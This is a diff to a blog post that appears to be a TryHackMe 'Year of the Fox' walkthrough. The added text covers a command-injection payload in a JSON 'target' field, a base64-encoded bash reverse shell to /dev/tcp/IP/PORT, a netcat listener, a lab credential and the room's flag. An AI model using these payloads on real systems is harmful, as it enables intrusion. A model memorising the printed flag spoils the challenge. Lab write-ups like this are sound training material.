@@ -2,7 +2,9 @@
 layout: post
 title:  "year-of-the-fox"
 date:   2026-11-05 21:05:27 -0500
-categories: writeups
+categories:
+  - writeups
+  - thm
 platform: thm
 level: Hard
 points: 90
@@ -84,7 +86,7 @@ Host script results:
 ````
 
 what we get until now : 
-- we might need a password in the web app in the port 80 since the hint says :HTTP/1.1 401 Unauthorized.
+- we might need a password in the web app in the port 80 since the hint says : **| HTTP/1.1 401 Unauthorized\x0D, Basic realm=You want in? Gotta guess the password!** .
 - the os is ubuntu .
 - the name of the box is : **year-of-the-fox**.
 - the domain name is : **year-of-the-fox.lan**.
@@ -92,7 +94,7 @@ what we get until now :
  
 add the domain name to the /etc/hosts in your machine :
 ````bash
-echo "ip year-of-the-fox.lan" |tee /etc/hosts
+echo "$ip year-of-the-fox.lan" |tee /etc/hosts
 ````
 ## SMB :
 lets start by enum the smb :
@@ -118,7 +120,7 @@ keep in mind the : **Password Complexity Flags: 000000** means there is no enfor
 - password
 - password123
 - Pa$$word123
-anything biger than 5 char.
+anything bigger than 5 char.
 
 ![Image]({{ site.baseurl }}/images/year-of-the-fox/5.png)
 
@@ -188,32 +190,89 @@ rascal:waterpolo
 ![Image]({{ site.baseurl }}/images/year-of-the-fox/13.png)
 
 time for some injection!! 
+
 ![Image]({{ site.baseurl }}/images/year-of-the-fox/14.png)
 
-I tried a few command injection attempts (such as `ls`), but it looks like certain commands are being filtered.
+i had to reboot the box . the ip changes from  **10.129.149.39** to **10.130.181.98**
+
+intercept the request in caido : 
 
 ![Image]({{ site.baseurl }}/images/year-of-the-fox/15.png)
 
-A possible way around this filter is to use Base64 encoding. Let's encode the `ls` command:
+After trying several command injection payloads, I eventually came up with the following JSON payload by injecting it into the `target` field:
 
-```bash
-echo -n 'ls' | base64
-
-# Output: bHM=
+```json
+{"target":"\"; pwd \""}
 ```
 
-And it works! The filter doesn't seem to recognize the encoded command.
+Breaking down the payload:
+
+- `"` closes the application's existing double-quoted argument.
+- `;` acts as a command separator, allowing us to execute a new command.
+- `pwd` is the injected command used to display the current working directory.
+- The final `"` closes the remaining quoted string.
+- The successful execution of `pwd` confirms that OS command injection is possible through the `target` parameter.
 
 ![Image]({{ site.baseurl }}/images/year-of-the-fox/16.png)
 
-Getting a reverse shell should be straightforward now:
+### Getting a Reverse Shell
 
-- Start a listener on our machine.
-- Base64-encode a reverse shell command.
-- Send the encoded payload through the injection point.
-- Sit back and enjoy a well-deserved coffee while waiting for the connection!
+After confirming command injection, the next step was to obtain a reverse shell.
 
-TO-BE-CONT
+1. **Prepare and Base64-encode the reverse shell command:**
+
+   Replace `IP` with your attacking machine's IP address and `PORT` with the listening port.
+
+   ```bash
+   echo -n 'bash -i &>/dev/tcp/IP/PORT <&1' | base64
+   ```
+
+2. **Start a Netcat listener on your attacking machine:**
+
+   ```bash
+   nc -lvnp PORT
+   ```
+
+3. **Inject the encoded payload through the `target` parameter:**
+
+   ```json
+   {"target":"\";echo BASE64_ENCODED_PAYLOAD | base64 -d | bash; \""}
+   ```
+
+![Image]({{ site.baseurl }}/images/year-of-the-fox/17.png)
+
+### Enumerating the Retrieved Files
+
+After obtaining access to the machine, I went through the files we had retrieved earlier. I noticed that `creads2.txt` contained data that appeared to be encoded using Base32 and Base64.
+
+I decoded it using the following command:
+
+```bash
+echo -n "LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAXUTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=" | base32 -d | base64 -d
+```
+
+The decoding process returned the following SHA-256-looking hash:
+
+```text
+c74341b26d29ad41da6cc68feedebd161103776555c21d77e3c2aa36d8c44730
+```
+
+### WEB FLAG**
+
+The first flag was also found:
+
+```text
+THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
+```
+
+### Privilege Escalation Enumeration
+
+With the web flag captured, the next step is to investigate the machine for potential privilege escalation vectors.
+
+I'll upload **LinPEAS** to the target machine and use it to enumerate the system.
+
+
+--to-be-cont
 
 **that's it guys i hope you found this useful .**
 
